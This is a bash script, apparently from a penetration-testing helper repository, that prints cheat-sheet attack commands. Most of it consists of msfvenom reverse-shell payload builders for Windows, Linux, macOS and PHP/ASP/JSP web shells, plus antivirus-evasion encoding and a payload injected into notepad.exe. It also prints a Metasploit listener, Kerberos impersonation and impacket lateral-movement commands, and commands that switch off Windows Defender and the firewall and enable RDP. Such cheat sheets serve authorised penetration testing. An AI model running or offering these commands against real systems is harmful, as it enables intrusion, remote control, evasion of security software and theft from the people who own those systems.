# Author Frank4o4
# https://github.com/frank4o4/Pentester-Shell



# Define Colours
red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'



# Web Page Fuzz options

fuzz()
{

printf "${red}Ferobuster${end} \n";
printf "${grn}feroxbuster -u http://192.168.x.x -x php,txt,aspx,asp,doc,docx,pdf\n";
printf "feroxbuster -u http://192.168.x.x --proxy socks5h://127.0.0.1:9050 ${end} \n\n"

printf "${red}WFUZZ ${end}\n";
printf "${grn}wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt --hs No account found with that username. -d username=FUZZ&password=password http://192.168.x.x/login.php ${end}\n";
printf "${grn}wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt https://domain.com/api/FUZZ${end}\n\n";


printf "${red}GoBuster ${end}\n";
printf "${grn}gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://192.168.x.x -k -x txt,php,html -t 40 ${end} \n\n";


printf "${red}Dirb ${end}\n";
printf "${grn}dirb http://192.168.x.x -X .php,html,txt ${end} \n\n";


printf "${red}whatweb${end}\n"
printf "${grn}whatweb -a 4 http://192.168.x.x${end}\n\n";

printf "${red}Nikto Scan ${end}\n";
printf "${grn}nikto -host=http://192.168.x.x ${end}\n\n";

printf "${red}WebDav ${end}\n";
printf "${grn}davtest -url http://192.168.x.x ${end}\n\n";


printf "${red}CMSMAP ${end}\n";
printf "${grn}cmsmap [-f W] -F -d http://192.168.x.x${end}\n\n";


printf "${red}Wordpress ${end}\n";
printf "${grn}wpscan --force update -e --url http://192.168.x.x ${end}\n\n";

printf "${red}Joomla ${end}\n";
printf "${grn}joomscan --ec -u http://192.168.x.x ${end}\n\n";






}


# NMAP options

scan()
{

printf "${red}Scan all Ports and output file ${end}\n";
printf "${grn}nmap -p- -sC -sV -o nmap.out 192.168.x.x ${end}\n\n";

printf "${red}Scan UDP ${end}\n";
printf "${grn}sudo nmap -sS -sU 192.168.x.x ${end}\n\n";


}



# Reverse Shell Options
revshell()
{

printf "${red}Clean Shell using Python on Linux ${end}\n";

printf "${grn}python -c 'import pty; pty.spawn("/bin/bash")' \n";
printf "python3 -c 'import pty; pty.spawn("/bin/bash")' ${end}\n\n";

printf "${grn}https://www.revshells.com/${end}\n\n";

}

metasploit()
{


printf "${red}Metasploit Options${end}\n";
printf "${grn}

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f vbapplication
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ps1

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p cmd/unix/reverse_bash LHOST="192.168.x.x" LPORT=8080 -f raw > shell.sh

# OSX
msfvenom -p osx/x86/shell_reverse_tcp LHOST="192.168.x.x" LPORT=8080 -f macho > shell.macho
msfvenom -p osx/x64/shell_reverse_tcp LHOST="192.168.x.x" LPORT=8080 -f macho > shell.macho

# Web Payloads
msfvenom -p php/meterpreter_reverse_tcp LHOST="192.168.x.x" LPORT=8080 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.x.x" LPORT=8080 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.x.x" LPORT=8080 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.x.x" LPORT=8080 -f war > shell.war
msfvenom -p cmd/unix/reverse_python LHOST="192.168.x.x" LPORT=8080 -f raw > shell.py
msfvenom -p cmd/unix/reverse_perl LHOST="192.168.x.x" LPORT=8080 -f raw > shell.pl

# Encoding payload

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 -e x64/zutto_dekiru -f exe -o /var/www/html/met64_zutto.exe

# Using Notepad to include a payload
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /var/www/html/met64_notepad.exe

# Leveraging the strength of aes256
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe


# MSFCONSOLE start with payload settings
sudo msfconsole -q -x use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.x.x; set LPORT 443; exploit


# Socket Proxy
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j 


${end}
";

}



ldap()
{

printf "${red}LDAP Stuff ${end}\n";

printf "${grn}
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass \n
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass \n
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass \n
ldapsearch -x -Y GSSAPI -H ldap://exmple.org -D \"user@example.org\" -W -b \"dc=example,dc=org\" \"servicePrincipalName=\" \n
kvno MSSQLSvc/DC01.example.org:1433 \n
klist \n
getST.py -spn CIFS/file01 -impersonate Administrator example.org/svc_user -dc-ip 192.168.x.x \n
export KRB5CCNAME=/tmp/krb5cc_minenow


${end}
";


}

winatp()
{
printf "${red}Windows ATP Stuff ${end}\n";
printf "${grn}

# Turn off ATP and Firewall
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
NetSh Advfirewall set allprofiles state off

# Check if Firewall is Enabled
netsh advfirewall show allprofiles

# Check if Antivirus is enabled
Get-MpPreference | select DisableIntrusionPreventionSystem, DsiableOAVProtection, DisableRealtimeMonitoring

${end}
";


}

winrdp()
{
printf "${red}Enable Remote Desktop ${end}\n";
printf "${grn}

# Execute powershell registry key
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0


# Enable RDP on box so we can connect as administrator
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

${end}
";


}

